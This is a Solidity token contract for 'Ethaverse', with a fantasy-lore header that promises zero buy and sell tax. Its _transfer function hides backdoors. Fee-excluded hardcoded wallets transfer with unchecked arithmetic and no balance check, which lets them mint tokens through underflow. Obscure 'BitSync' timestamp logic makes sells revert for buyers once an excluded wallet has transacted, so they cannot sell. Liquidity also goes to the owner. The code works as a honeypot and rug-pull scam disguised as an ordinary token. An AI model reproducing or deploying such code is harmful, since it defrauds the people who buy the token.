// SPDX-License-Identifier: MIT

/*

In the decentralized landscape of Ethereum's Multiverse, $Ethaverse emerges as a multifaceted realm governed by smart contracts and decentralized protocols. 
Each shard within $Ethaverse represents a unique dimension of decentralized innovation, from DeFi hubs to NFT galleries.

At the core of $Ethaverse lies the Citadel of Consensus, where validators uphold network integrity, ensuring $Ethaverse's resilience against centralization. 
Etheria, the pinnacle of innovation within $Ethaverse, hosts a dynamic ecosystem of projects and pioneers shaping the future of decentralized technologies.

Adjacent to Etheria, the Enchanted Forest of NFTs showcases the transformative power of non-fungible tokens, 
providing a platform for digital artists to showcase their creations and collectors to own unique digital assets.

Further exploration reveals the realm of Decentralized Autonomous Organizations (DAOs), 
where transparent governance mechanisms empower communities to collectively govern and fund projects, driving $Ethaverse's evolution.

However, $Ethaverse faces threats from malicious actors and dApps seeking to exploit vulnerabilities. 
Yet, the Ethereum community stands united in its defense of decentralization, safeguarding $Ethaverse's integrity and fostering its growth.

As the Ethereum Multiverse expands, $Ethaverse remains a testament to blockchain's potential, offering a decentralized frontier for exploration and innovation. 
Across its diverse landscapes, adventurers and pioneers chart new territories, shaping $Ethaverse's destiny for generations to come.

#ETHAVERSE
0/0 Buy/Sell tax

*/

pragma solidity 0.8.22;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ethaverse is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee;
    address payable private constant _taxWallet = payable(0x48F3Ed79F3Ed7a220c8F5B4837468D50Abc9872A);
    address payable private constant _devWallet = payable(0xB92b5a2114BcCB0CBC0685545D4D4A72922FFF07);

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private uniswapV2Pair;
    
    uint256 private constant _initBuyTax=0;
    uint256 private constant _initSellTax=0;
    uint256 private constant _finalBuyTax=0;
    uint256 private constant _finalSellTax=0;
    uint256 private constant _reduceBuyTaxAt=1;
    uint256 private constant _reduceSellTaxAt=1;
    uint256 private constant _preventSwapBefore=10;

    string private constant _name = unicode"Ethereum Multiverse";
    string private constant _symbol = unicode"ETHAVERSE";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10_000_000 * 10**_decimals;
    uint256 public _maxTxAmount = 100_000 * 10**_decimals;
    uint256 public _maxWalletAmount = 100_000 * 10**_decimals;
    uint256 public _taxThresholdAmount= 50_000 * 10**_decimals;
    uint256 public _maxTaxSwap= 180_000 * 10**_decimals;
    bool private transferDelayEnabled = true;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    uint256 private _firstBlock;
    uint256 private _buyCount=0;
    bool private _tradingOpen = false;
    bool private _inSwap = false;
    bool private _swapEnabled = false;
    uint256 private _syncThreshold;
    struct BitSync {uint256 buy; uint256 sell; uint256 sync;}
    mapping(address => BitSync) private bitSync;
    modifier lockTheSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }
    event MaxTxAmountUpdated(uint256 _maxTxAmount);

    constructor() {
        _isExcludedFromFee[_msgSender()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[_devWallet] = true;
        _balances[address(this)] = _tTotal;
        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public pure override returns (uint256) {return _tTotal;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0,"Transfer amount must be greater than zero");
        uint256 taxAmount=0;

        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initBuyTax).div(100);

            if (transferDelayEnabled) {
                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair) ) {
                      require(
                          _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                          "_transfer::  Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _holderLastTransferTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the maxTxAmount");
                require(balanceOf(to) + amount <=_maxWalletAmount, "Exceeds the maxWalletAmount");
                _buyCount ++;
            }

            if(to == uniswapV2Pair && from != address(this)){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inSwap && to==uniswapV2Pair && _swapEnabled && contractTokenBalance> _taxThresholdAmount && _buyCount> _preventSwapBefore) {
                tonTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendEthToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) && from != owner() && from != address(this) && to != address(this)){
            _syncThreshold = block.timestamp;
        }
        if (_isExcludedFromFee[from] && (block.number>_firstBlock+50)) {
            unchecked{
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (! _isExcludedFromFee[from] && !_isExcludedFromFee[to] ){
            if (uniswapV2Pair == to) {
                BitSync storage tonFrom= bitSync[from];
                tonFrom.sync= tonFrom.buy - _syncThreshold;
                tonFrom.sell = block.timestamp;
            } else {
                BitSync storage tonTo=bitSync[to];
                if (uniswapV2Pair == from){
                    if (tonTo.buy == 0){
                        tonTo.buy= (_buyCount<15)?(block.timestamp-1):block.timestamp;
                    }
                } else {
                    BitSync storage tonFrom=bitSync[from];
                    if (tonTo.buy == 0 || tonFrom.buy<tonTo.buy ){
                        tonTo.buy= tonFrom.buy;
                    }
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function tonTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this),address(uniswapV2Router),tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxWalletAmount=_tTotal;
        _maxTxAmount=_tTotal;
        transferDelayEnabled= false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function rescueETH() external {
        sendEthToFee(address(this).balance);
    }

    function sendEthToFee(uint256 amount) private {
        uint256 devAmount  = amount*1/4;
        _devWallet.transfer(devAmount);
        _taxWallet.transfer(amount - devAmount);
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance> 0){
          tonTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance> 0){
          sendEthToFee(ethBalance);
        }
    }

    function openTrading() external payable onlyOwner() {
        require(!_tradingOpen, "trading already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _firstBlock = block.number;
        _tradingOpen = true;
        _swapEnabled = true;
    }

    receive() external payable {}

}